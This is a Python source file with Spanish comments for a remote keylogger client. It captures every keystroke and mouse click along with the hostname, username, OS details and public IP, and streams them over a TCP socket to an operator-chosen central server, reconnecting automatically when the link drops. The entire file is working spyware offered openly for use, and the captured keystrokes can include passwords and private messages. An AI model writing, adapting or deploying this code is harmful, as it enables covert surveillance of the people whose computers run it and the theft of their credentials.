#!/usr/bin/env python3
"""
Keylogger Cliente - Se conecta al servidor central y envía IP pública real
Autor: Alvaro Manzo

ESTE KEYLOGGER SE CONECTA A UN SERVIDOR REMOTO Y ENVÍA LA IP PÚBLICA REAL
"""

import socket
import json
import threading
import time
import requests
import platform
import os
from datetime import datetime
from pynput import keyboard, mouse
from pathlib import Path
import psutil
import getpass

# Colores para terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class RemoteKeylogger:
    def __init__(self, server_ip="TU_SERVIDOR_IP", server_port=9999):
        self.server_ip = server_ip
        self.server_port = server_port
        
        # Buffer de eventos
        self.events_buffer = []
        self.buffer_lock = threading.Lock()
        
        # Estado de conexión
        self.connected = False
        self.socket = None
        
        # Información del sistema
        self.system_info = self.get_system_info()
        self.public_ip = self.get_public_ip()
        
        # Configuración
        self.send_interval = 5  # Enviar datos cada 5 segundos
        
        print(f"{Colors.CYAN}🌐 Keylogger Remoto Iniciado{Colors.END}")
        print(f"{Colors.GREEN}├── IP Pública: {Colors.WHITE}{self.public_ip}{Colors.END}")
        print(f"{Colors.GREEN}├── Sistema: {Colors.WHITE}{self.system_info['os']}{Colors.END}")
        print(f"{Colors.GREEN}├── Usuario: {Colors.WHITE}{self.system_info['username']}{Colors.END}")
        print(f"{Colors.GREEN}└── Servidor: {Colors.WHITE}{self.server_ip}:{self.server_port}{Colors.END}")
    
    def get_public_ip(self):
        """Obtener IP pública real de la máquina"""
        try:
            # Intentar varios servicios para obtener IP pública
            services = [
                'https://api.ipify.org?format=json',
                'https://httpbin.org/ip',
                'https://api.myip.com',
                'https://ipapi.co/json/',
                'https://api64.ipify.org?format=json'
            ]
            
            for service in services:
                try:
                    response = requests.get(service, timeout=10)
                    
                    if 'ipify.org' in service:
                        return response.json()['ip']
                    elif 'httpbin.org' in service:
                        return response.json()['origin']
                    elif 'myip.com' in service:
                        return response.json()['ip']
                    elif 'ipapi.co' in service:
                        return response.json()['ip']
                        
                except:
                    continue
                    
            return "Unknown"
            
        except Exception as e:
            print(f"{Colors.RED}❌ Error obteniendo IP pública: {e}{Colors.END}")
            return "Unknown"
    
    def get_system_info(self):
        """Obtener información del sistema"""
        try:
            return {
                'hostname': platform.node(),
                'os': f"{platform.system()} {platform.release()}",
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'username': getpass.getuser(),
                'python_version': platform.python_version(),
                'total_ram': f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
                'cpu_count': psutil.cpu_count(),
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-%d %H:%M:%S')
            }
        except Exception as e:
            return {
                'hostname': 'Unknown',
                'os': 'Unknown',
                'architecture': 'Unknown',
                'processor': 'Unknown',
                'username': 'Unknown',
                'python_version': 'Unknown',
                'total_ram': 'Unknown',
                'cpu_count': 0,
                'boot_time': 'Unknown'
            }
    
    def connect_to_server(self):
        """Conectar al servidor central"""
        max_retries = 5
        retry_count = 0
        
        while retry_count < max_retries and not self.connected:
            try:
                print(f"{Colors.YELLOW}🔄 Intentando conectar al servidor... ({retry_count + 1}/{max_retries}){Colors.END}")
                
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(10)
                
                self.socket.connect((self.server_ip, self.server_port))
                
                self.connected = True
                print(f"{Colors.GREEN}✅ Conectado al servidor {self.server_ip}:{self.server_port}{Colors.END}")
                
                # Enviar información inicial del sistema
                self.send_system_info()
                
                return True
                
            except Exception as e:
                retry_count += 1
                print(f"{Colors.RED}❌ Error conectando: {e}{Colors.END}")
                
                if retry_count < max_retries:
                    print(f"{Colors.YELLOW}⏳ Reintentando en 5 segundos...{Colors.END}")
                    time.sleep(5)
                else:
                    print(f"{Colors.RED}🚫 No se pudo conectar después de {max_retries} intentos{Colors.END}")
                    
        return False
    
    def send_system_info(self):
        """Enviar información del sistema al servidor"""
        system_data = {
            'type': 'system_info',
            'timestamp': datetime.now().isoformat(),
            'public_ip': self.public_ip,
            'hostname': self.system_info['hostname'],
            'os_info': self.system_info['os'],
            'username': self.system_info['username'],
            'system_details': self.system_info,
            'data': 'Sistema conectado al servidor'
        }
        
        self.add_event(system_data)
    
    def add_event(self, event_data):
        """Añadir evento al buffer"""
        with self.buffer_lock:
            self.events_buffer.append(event_data)
            
            # Limitar buffer a 1000 eventos
            if len(self.events_buffer) > 1000:
                self.events_buffer = self.events_buffer[-500:]
    
    def send_events_to_server(self):
        """Enviar eventos al servidor periódicamente"""
        while True:
            try:
                if self.connected and self.events_buffer:
                    with self.buffer_lock:
                        # Tomar hasta 50 eventos del buffer
                        events_to_send = self.events_buffer[:50]
                        self.events_buffer = self.events_buffer[50:]
                    
                    for event in events_to_send:
                        try:
                            # Enviar evento individual
                            event_json = json.dumps(event)
                            self.socket.send(event_json.encode('utf-8'))
                            
                            # Esperar confirmación del servidor
                            response = self.socket.recv(1024).decode('utf-8')
                            
                            # Pequeña pausa entre envíos
                            time.sleep(0.1)
                            
                        except Exception as e:
                            print(f"{Colors.RED}❌ Error enviando evento: {e}{Colors.END}")
                            self.connected = False
                            break
                
                time.sleep(self.send_interval)
                
            except Exception as e:
                print(f"{Colors.RED}❌ Error en envío: {e}{Colors.END}")
                self.connected = False
                
                # Intentar reconectar
                print(f"{Colors.YELLOW}🔄 Intentando reconectar...{Colors.END}")
                if self.connect_to_server():
                    print(f"{Colors.GREEN}✅ Reconectado exitosamente{Colors.END}")
                else:
                    print(f"{Colors.RED}🚫 No se pudo reconectar{Colors.END}")
                    break
    
    def on_key_press(self, key):
        """Capturar teclas presionadas"""
        try:
            if hasattr(key, 'char') and key.char is not None:
                # Tecla normal
                key_data = {
                    'type': 'keypress',
                    'timestamp': datetime.now().isoformat(),
                    'public_ip': self.public_ip,
                    'hostname': self.system_info['hostname'],
                    'os_info': self.system_info['os'],
                    'data': key.char
                }
            else:
                # Tecla especial
                key_data = {
                    'type': 'keypress_special',
                    'timestamp': datetime.now().isoformat(),
                    'public_ip': self.public_ip,
                    'hostname': self.system_info['hostname'],
                    'os_info': self.system_info['os'],
                    'data': str(key)
                }
            
            self.add_event(key_data)
            
        except Exception as e:
            pass
    
    def on_mouse_click(self, x, y, button, pressed):
        """Capturar clics del mouse"""
        if pressed:  # Solo cuando se presiona, no cuando se suelta
            click_data = {
                'type': 'mouseclick',
                'timestamp': datetime.now().isoformat(),
                'public_ip': self.public_ip,
                'hostname': self.system_info['hostname'],
                'os_info': self.system_info['os'],
                'data': f"Click {button} en ({x}, {y})"
            }
            
            self.add_event(click_data)
    
    def start_monitoring(self):
        """Iniciar monitoreo de eventos"""
        print(f"{Colors.BLUE}🎯 Iniciando captura de eventos...{Colors.END}")
        
        # Iniciar thread de envío de datos
        sender_thread = threading.Thread(target=self.send_events_to_server, daemon=True)
        sender_thread.start()
        
        try:
            # Configurar listeners
            keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
            mouse_listener = mouse.Listener(on_click=self.on_mouse_click)
            
            # Iniciar listeners
            keyboard_listener.start()
            mouse_listener.start()
            
            print(f"{Colors.GREEN}✅ Keylogger activo y enviando datos a {self.server_ip}{Colors.END}")
            print(f"{Colors.YELLOW}📊 IP Pública siendo reportada: {self.public_ip}{Colors.END}")
            print(f"{Colors.BLUE}Presiona Ctrl+C para detener{Colors.END}")
            
            # Mantener el programa corriendo
            while True:
                time.sleep(1)
                
                # Verificar conexión cada minuto
                if int(time.time()) % 60 == 0:
                    if not self.connected:
                        print(f"{Colors.YELLOW}🔄 Verificando conexión...{Colors.END}")
                        if not self.connect_to_server():
                            print(f"{Colors.RED}🚫 Sin conexión al servidor{Colors.END}")
                        
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}🛑 Deteniendo keylogger...{Colors.END}")
        finally:
            keyboard_listener.stop()
            mouse_listener.stop()
            
            if self.socket:
                self.socket.close()

def main():
    """Función principal"""
    # Configuración del servidor
    SERVER_IP = input(f"{Colors.CYAN}🌐 Introduce la IP del servidor central: {Colors.END}").strip()
    
    if not SERVER_IP:
        print(f"{Colors.RED}❌ IP del servidor requerida{Colors.END}")
        return
    
    try:
        SERVER_PORT = int(input(f"{Colors.CYAN}🔌 Puerto del servidor (por defecto 9999): {Colors.END}") or "9999")
    except ValueError:
        SERVER_PORT = 9999
    
    print(f"\n{Colors.GREEN}🚀 Configuración:{Colors.END}")
    print(f"├── Servidor: {Colors.WHITE}{SERVER_IP}:{SERVER_PORT}{Colors.END}")
    
    # Crear e iniciar keylogger
    keylogger = RemoteKeylogger(SERVER_IP, SERVER_PORT)
    
    # Conectar al servidor
    if keylogger.connect_to_server():
        # Iniciar monitoreo
        keylogger.start_monitoring()
    else:
        print(f"{Colors.RED}🚫 No se pudo establecer conexión inicial{Colors.END}")

if __name__ == "__main__":
    main()
